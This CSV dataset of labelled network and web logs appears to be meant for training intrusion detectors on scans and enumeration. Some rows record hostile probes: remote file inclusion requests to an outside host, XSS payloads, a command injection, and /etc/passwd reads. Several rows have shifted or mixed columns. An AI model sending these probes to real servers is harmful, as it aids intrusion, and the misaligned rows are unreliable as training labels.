@timestamp,src_ip,src_port,dst_ip,dst_port,Protocol,http_request_method,http_request_referrer,http_response_code,url_path,user_agent_original,sql_method,sql_query,category,label_
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691983,10.32.4.176,41836,10.132.100.53,3971,TCP,0,0,0,0,0,0,0,port_scan,0
1666582465,192.168.207.142,0,0,0,HTTPS,GET,0,404,/LvAjqjtV.htaccess~,Mozilla/5.00,0,0,web_enumeration,1
1666690178,192.168.34.11,53112,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/log/,0,0,0,web_enumeration,2
1666692078,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666542593,192.168.1.225,54744,40.90.184.73,443,2022-10-24 00:29:24 ALLOW TCP 192.168.1.225 40.90.184.73 54744 443 0 - 0 0 0 - - - SEND 13564,TCP,0,0,0,0,0,0,port_scan,1
1666692133,10.32.4.176,57772,10.132.100.52,22,TCP,0,0,0,0,0,0,0,port_scan,0
1666591407,10.0.0.20,33902,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID
					FROM wp_posts 
					WHERE 1=1  AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish')))
					
					ORDER BY wp_posts.post_date DESC
					LIMIT 0, 10",sql_enumeration,0
1666630690,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666591947,10.0.0.20,34356,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT wp_posts.* FROM wp_posts WHERE ID IN (1),sql_enumeration,0
1666591277,10.0.0.20,33786,10.0.0.21,3306,mysql,0,0,0,0,0,SET,"SET SESSION sql_mode='ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION'",sql_enumeration,0
1666580393,192.168.207.142,0,0,0,HTTPS,GET,0,404,/168.war,Mozilla/5.00,0,0,web_enumeration,1
1666580392,192.168.207.142,0,0,0,HTTPS,GET,0,404,/6TpFBbQz.show,Mozilla/5.00,0,0,web_enumeration,1
1666692064,10.132.100.52,80,10.32.4.176,46376,TCP,0,0,0,0,0,0,0,port_scan,0
1666692145,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666580390,192.168.207.142,0,0,0,HTTPS,GET,0,404,/admin_logon,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666542250,192.168.1.254,33947,239.255.255.250,1900,2022-10-24 00:23:42 DROP UDP 192.168.1.254 239.255.255.250 33947 1900 505 - - - - - - - RECEIVE 11164,UDP,0,0,0,0,0,0,port_scan,2
1666690178,192.168.34.11,53112,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/jj,0,0,0,web_enumeration,2
1666591807,10.0.0.20,34240,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT FOUND_ROWS(),sql_enumeration,0
1666690178,192.168.34.11,53114,192.168.33.12,0,HTTP,0,0,0,/caupo/admin/admin_workspace.php,0,0,0,web_enumeration,2
1666591650,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1664372838,192.168.91.15,49404,239.255.255.250,1900,UDP,0,0,0,0,0,0,0,port_scan,2
1666542056,0,50806,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666690179,192.168.34.11,53138,192.168.33.12,0,HTTP,0,0,0,/forum1.asp,0,0,0,web_enumeration,2
1666692055,10.32.4.176,56470,10.132.100.52,2020,TCP,0,0,0,0,0,0,0,port_scan,0
1666542079,192.168.106.1,61405,192.168.106.130,53,2022-10-24 00:21:03 ALLOW UDP 192.168.106.1 192.168.106.130 61405 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666697958, 192.168.10.2,9200,47636,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691932,100.64.19.103,38788,100.64.19.22,8600,TCP,0,0,0,0,0,0,0,port_scan,3
1666582479,192.168.207.142,0,0,0,HTTPS,GET,0,404,/db/mysql/db.inc.php?SPL_CFG[dirroot]=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/connections,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692058,10.32.4.176,50386,10.132.100.52,903,TCP,0,0,0,0,0,0,0,port_scan,0
1666691931,100.64.19.103,45834,100.64.19.22,3128,TCP,0,0,0,0,0,0,0,port_scan,3
1666691974,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580393,192.168.207.142,0,0,0,HTTPS,GET,0,404,/168.tar.gz,Mozilla/5.00,0,0,web_enumeration,1
1666692055,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582478,192.168.207.142,0,0,0,HTTPS,GET,0,404,/classes/Auth/OpenID/Extension.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580398,192.168.207.142,0,0,0,HTTPS,GET,0,404,/test/phpinfo.php3,Mozilla/5.00,0,0,web_enumeration,1
1666591757,10.0.0.20,34198,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID
					FROM wp_posts 
					WHERE 1=1  AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish')))
					
					ORDER BY wp_posts.post_date DESC
					LIMIT 0, 10",sql_enumeration,0
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666591347,10.0.0.20,33852,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'medium_crop' LIMIT 1,sql_enumeration,0
1666582473,192.168.207.142,0,0,0,HTTPS,GET,0,404,/temp/,Mozilla/5.00,0,0,web_enumeration,1
1666691985,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666630367,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666542072,192.168.106.1,53473,192.168.106.130,53,2022-10-24 00:20:44 ALLOW UDP 192.168.106.1 192.168.106.130 53473 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666591007,10.0.0.20,33560,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT wp_posts.* FROM wp_posts WHERE ID IN (1),sql_enumeration,0
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691985,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666691984,10.32.4.176,57298,10.132.100.53,15742,TCP,0,0,0,0,0,0,0,port_scan,0
1666692057,10.32.4.176,37498,10.132.100.52,2144,TCP,0,0,0,0,0,0,0,port_scan,0
1666692058,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691970,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666527923,192.168.0.3,0,0,0,0,0,0,0,0,0,0,0,smtp_enumeration,1
1666631526,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666692065,10.132.100.52,80,10.32.4.176,46512,TCP,0,0,0,0,0,0,0,port_scan,0
1666591877,10.0.0.20,34298,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT option_name, option_value FROM wp_options WHERE autoload = 'yes'",sql_enumeration,0
1666582475,192.168.207.142,0,0,0,HTTPS,GET,0,404,/acart2_0/admin/category.asp,Mozilla/5.00,0,0,web_enumeration,1
1666700218, 192.168.10.2,9200,47640,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1664429480,167.71.195.165,123,192.168.91.128,39045,udp,0,0,0,0,0,0,0,port_scan,2
1666582469,192.168.207.142,0,0,0,HTTPS,GET,0,404,/msadm/site/index.php3?authid=\x5C\x22><script>alert('Vulnerable')</script>,Mozilla/5.00,0,0,web_enumeration,1
1666691931,100.64.19.103,34398,100.64.19.22,1056,TCP,0,0,0,0,0,0,0,port_scan,3
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/developement.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666691984,10.32.4.176,36046,10.132.100.53,4446,TCP,0,0,0,0,0,0,0,port_scan,0
1666590850,0,0,10.0.0.21,0,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692146,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666542072,0,53454,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666582471,192.168.207.142,0,0,0,HTTPS,GET,0,404,/modules/index.php?Nikto=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,Mozilla/5.00,0,0,web_enumeration,1
1666582471,192.168.207.142,0,0,0,HTTPS,GET,0,404,/forum/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,Mozilla/5.00,0,0,web_enumeration,1
1666692065,10.32.4.176,46502,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/ingress.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666690179,192.168.34.11,53138,192.168.33.12,0,HTTP,0,0,0,/forum1.asp,0,0,0,web_enumeration,2
1666541373,192.168.1.225,53457,146.75.92.193,443,2022-10-24 00:09:02 ALLOW TCP 192.168.1.225 146.75.92.193 53457 443 0 - 0 0 0 - - - SEND 18232,TCP,0,0,0,0,0,0,port_scan,2
1666690179,192.168.34.11,53232,192.168.33.12,0,HTTP,0,0,0,/Site/biztalkhttpreceive.dll,0,0,0,web_enumeration,2
1666591290,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666591337,10.0.0.20,33844,10.0.0.21,3306,mysql,0,0,0,0,0,SET,SET NAMES 'utf8mb4' COLLATE 'utf8mb4_unicode_ci',sql_enumeration,0
1666580393,192.168.207.142,0,0,0,HTTPS,GET,0,404,/192.168.207.167.war,Mozilla/5.00,0,0,web_enumeration,1
1666691974,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666591329,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692133,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582481,192.168.207.142,0,0,0,HTTPS,GET,0,404,/phpwcms_template/inc_script/frontend_render/navigation/config_PHPLM.php?HTML_MENU_DirPath=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666582467,192.168.207.142,0,0,0,HTTPS,GET,0,404,/192168207.tgz,Mozilla/5.00,0,0,web_enumeration,1
1666700704, 192.168.10.2,9200,47640,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666591477,10.0.0.20,33962,10.0.0.21,3306,mysql,0,0,0,0,0,SET,SET NAMES utf8mb4,sql_enumeration,0
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/signature.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666580398,192.168.207.142,0,0,0,HTTPS,GET,0,404,/src/read_body.php?mailbox=%3Cscript%3Ealert(Vulnerable)%3C%2Fscript%3E&passed_id=%3Cscript%3Ealert(Vulnerable)%3C%2Fscript%3E&startMessage=1&show_more=0,Mozilla/5.00,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666690178,192.168.34.11,53112,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/jj,0,0,0,web_enumeration,2
1666691993,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666695708, 192.168.10.2,9200,47634,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580396,192.168.207.142,0,0,0,HTTPS,GET,0,404,/cart/,Mozilla/5.00,0,0,web_enumeration,1
1666691931,100.64.19.103,54372,100.64.19.22,1580,TCP,0,0,0,0,0,0,0,port_scan,3
1666590897,10.0.0.20,33464,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT @@SESSION.sql_mode,sql_enumeration,0
1666580396,192.168.207.142,0,0,0,HTTPS,GET,0,404,/postnuke/html/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,Mozilla/5.00,0,0,web_enumeration,1
1666541551,127.0.0.1,58409,127.0.0.1,58408,2022-10-24 00:12:07 ALLOW TCP 127.0.0.1 127.0.0.1 58409 58408 0 - 0 0 0 - - - RECEIVE 27516,TCP,0,0,0,0,0,0,port_scan,3
1666348670,192.168.0.3,58224,192.168.0.2,9200,tcp,0,0,0,0,0,0,0,port_scan,2
1666582482,192.168.207.142,0,0,0,HTTPS,GET,0,404,/streamline-1.0-beta4/src/core/theme/includes/account_footer.php?sl_theme_unix_path=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/portlet,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666580394,192.168.207.142,0,0,0,HTTPS,GET,0,404,/SilverStream/Meta/Tables/?access-mode=text,Mozilla/5.00,0,0,web_enumeration,1
1666542071,0,51003,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666591230,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666692145,10.132.100.52,80,10.32.4.176,43526,TCP,0,0,0,0,0,0,0,port_scan,0
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691931,100.64.19.103,53292,100.64.19.22,5903,TCP,0,0,0,0,0,0,0,port_scan,3
1666692111,10.132.101.52,51758,10.132.101.101,135,TCP,0,0,0,0,0,0,0,port_scan,0
1666691974,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666691973,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666631461,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666692058,10.32.4.176,36944,10.132.100.52,4900,TCP,0,0,0,0,0,0,0,port_scan,0
1666692082,10.32.4.176,40080,10.132.100.52,22,TCP,0,0,0,0,0,0,0,port_scan,0
1666580406,192.168.207.142,0,0,0,HTTPS,GET,0,404,/desktopmodules/feedbackdesigner/ajaxfbs/frmupload.html,Mozilla/5.00,0,0,web_enumeration,1
1666590907,10.0.0.20,33472,10.0.0.21,3306,mysql,0,0,0,0,0,SET,SET NAMES 'utf8mb4' COLLATE 'utf8mb4_unicode_ci',sql_enumeration,0
1666542079,0,53890,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666630949,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666542071,192.168.106.1,50949,192.168.106.130,53,2022-10-24 00:20:36 ALLOW UDP 192.168.106.1 192.168.106.130 50949 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666580399,192.168.207.142,0,0,0,HTTPS,GET,0,404,/doc/LICENSE.SMAIL893,Mozilla/5.00,0,0,web_enumeration,1
1666692057,10.32.4.176,46796,10.132.100.52,88,TCP,0,0,0,0,0,0,0,port_scan,0
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/mail,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666582479,192.168.207.142,0,0,0,HTTPS,GET,0,404,/gepi/gestion/savebackup.php?fileNikto=http://cirt.net/rfiinc.txt?&cmd=cat/etc/passwd,Mozilla/5.00,0,0,web_enumeration,1
1664374199,192.168.91.128,50994,192.168.91.1,139,TCP,0,0,0,0,0,0,0,port_scan,2
1666591317,10.0.0.22,56884,10.0.0.20,80,http,0,0,0,0,0,GET,GET /,sql_enumeration,0
1666591977,10.0.0.20,34382,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT option_name, option_value FROM wp_options WHERE autoload = 'yes'",sql_enumeration,0
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692078,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666541358,0,53394,127.0.0.1,1120,0,0,0,0,0,0,0,0,port_scan,3
1666697712, 192.168.10.2,9200,47636,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666690179,192.168.34.11,53206,192.168.33.12,0,HTTP,0,0,0,/intranet/browse.php,0,0,0,web_enumeration,2
1666582472,192.168.207.142,0,0,0,HTTPS,GET,0,404,/exe/,Mozilla/5.00,0,0,web_enumeration,1
1666630961,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666690179,192.168.34.11,53232,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/awl/auctionweaver.pl,0,0,0,web_enumeration,2
1666692057,10.32.4.176,45482,10.132.100.52,5221,TCP,0,0,0,0,0,0,0,port_scan,0
1666692057,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692058,10.32.4.176,37996,10.132.100.52,22,TCP,0,0,0,0,0,0,0,port_scan,0
1666590780,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666691984,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/lib.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666691956,100.64.19.22,8443,100.64.19.103,43562,TCP,0,0,0,0,0,0,0,port_scan,3
1666691975,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 10.0.0.3,4444,45530,192.168.10.2,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666590990,0,0,10.0.0.21,0,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692128,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666347670,192.168.0.3,58224,192.168.0.2,9200,tcp,0,0,0,0,0,0,0,port_scan,2
1666591847,10.0.0.20,34274,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'can_compress_scripts' LIMIT 1,sql_enumeration,0
1666690178,192.168.34.11,53112,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/survey,0,0,0,web_enumeration,2
1666591000,0,0,10.0.0.20,80,0,0,0,0,0,0,0,0,sql_enumeration,0
1666580395,192.168.207.142,0,0,0,HTTPS,GET,0,404,/<script>alert('Vulnerable')</script>.shtm,Mozilla/5.00,0,0,web_enumeration,1
1666692038,10.32.4.176,0,10.132.100.50,0,UDP,0,0,0,0,0,0,0,port_scan,0
1666541336,127.0.0.1,53166,127.0.0.1,1120,2022-10-24 00:08:24 ALLOW TCP 127.0.0.1 127.0.0.1 53166 1120 0 - 0 0 0 - - - SEND 6624,TCP,0,0,0,0,0,0,port_scan,3
1666691993,10.132.100.53,22,10.32.4.176,57578,TCP,0,0,0,0,0,0,0,port_scan,0
1666580406,192.168.207.142,0,0,0,HTTPS,GET,0,404,/oam/,Mozilla/5.00,0,0,web_enumeration,1
1666591979,0,0,10.0.0.22,5044,0,0,0,0,0,0,0,0,sql_enumeration,0
1666422460,192.168.0.3,54468,192.168.0.2,9200,tcp,0,0,0,0,0,0,0,port_scan,2
1666692056,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691985,10.32.4.176,47382,10.132.100.53,3659,TCP,0,0,0,0,0,0,0,port_scan,0
1666692118,10.32.4.176,40080,10.132.100.52,22,TCP,0,0,0,0,0,0,0,port_scan,0
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666582480,192.168.207.142,0,0,0,HTTPS,GET,0,200,/index.php?body=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691983,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691931,100.64.19.103,44658,100.64.19.22,3077,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666590627,10.0.0.20,33236,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent-comments' LIMIT 1,sql_enumeration,0
1666690179,192.168.34.11,53114,192.168.33.12,0,HTTP,0,0,0,/Data/settings.xml+,0,0,0,web_enumeration,2
1666692114,10.132.101.52,56234,10.132.101.101,21,TCP,0,0,0,0,0,0,0,port_scan,0
1666692057,10.32.4.176,51736,10.132.100.52,7100,TCP,0,0,0,0,0,0,0,port_scan,0
1666591277,10.0.0.22,56842,10.0.0.20,80,http,0,0,0,0,0,GET,GET /,sql_enumeration,0
1666591847,10.0.0.20,34274,10.0.0.21,3306,mysql,0,0,0,0,0,SET,"SET SESSION sql_mode='ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION'",sql_enumeration,0
1666631245,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666690179,192.168.34.11,53206,192.168.33.12,0,HTTP,0,0,0,/netget,0,0,0,web_enumeration,2
1666542079,192.168.106.1,53917,192.168.106.130,53,2022-10-24 00:20:52 ALLOW UDP 192.168.106.1 192.168.106.130 53917 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666692057,10.32.4.176,39778,10.132.100.52,1081,TCP,0,0,0,0,0,0,0,port_scan,0
1666542079,192.168.106.1,61362,192.168.106.130,53,2022-10-24 00:21:02 ALLOW UDP 192.168.106.1 192.168.106.130 61362 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666712776, 10.0.0.3,44352,8080,192.168.10.2,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691984,10.32.4.176,44304,10.132.100.53,37,TCP,0,0,0,0,0,0,0,port_scan,0
1666712696, 192.168.10.2,9200,58598,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666591927,10.0.0.20,34340,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'WPLANG' LIMIT 1,sql_enumeration,0
1666691983,10.32.4.176,35214,10.132.100.53,254,TCP,0,0,0,0,0,0,0,port_scan,0
1666542079,0,53893,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666692066,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666582483,192.168.207.142,0,0,0,HTTPS,GET,0,404,/web/BetaBlockModules/GroupsCategoryModule/GroupsCategoryModule.php?path_prefix=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666692064,10.132.100.52,80,10.32.4.176,46302,TCP,0,0,0,0,0,0,0,port_scan,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/zipfiles,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666582487,192.168.207.142,0,0,0,HTTPS,GET,0,404,/adminer-4.3.0-mysql-en.php,Mozilla/5.00,0,0,web_enumeration,1
1666591367,10.0.0.22,0,10.0.0.20,0,0,0,0,0,0,0,0,0,sql_enumeration,0
1666691931,100.64.19.103,51096,100.64.19.22,5033,TCP,0,0,0,0,0,0,0,port_scan,3
1666582472,192.168.207.142,0,0,0,HTTPS,GET,0,404,/cuentas/,Mozilla/5.00,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692133,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666541321,0,53119,127.0.0.1,1120,0,0,0,0,0,0,0,0,port_scan,3
1666580398,192.168.207.142,0,0,0,HTTPS,GET,0,404,/cms/typo3/dev/translations.php,Mozilla/5.00,0,0,web_enumeration,1
1666692058,10.32.4.176,46986,10.132.100.52,3659,TCP,0,0,0,0,0,0,0,port_scan,0
1666542072,192.168.106.1,53552,192.168.106.130,53,2022-10-24 00:20:46 ALLOW UDP 192.168.106.1 192.168.106.130 53552 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666690179,192.168.34.11,53206,192.168.33.12,0,HTTP,0,0,0,/options.inc.php+,0,0,0,web_enumeration,2
1666690179,192.168.34.11,53232,0,0,HTTP,0,0,0,0,0,0,0,web_enumeration,1
1666692055,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580408,192.168.207.142,0,0,0,HTTPS,GET,0,404,/shell?cat%20/etc/passwd,Mozilla/5.00,0,0,web_enumeration,1
1666691984,10.32.4.176,48078,10.132.100.53,1154,TCP,0,0,0,0,0,0,0,port_scan,0
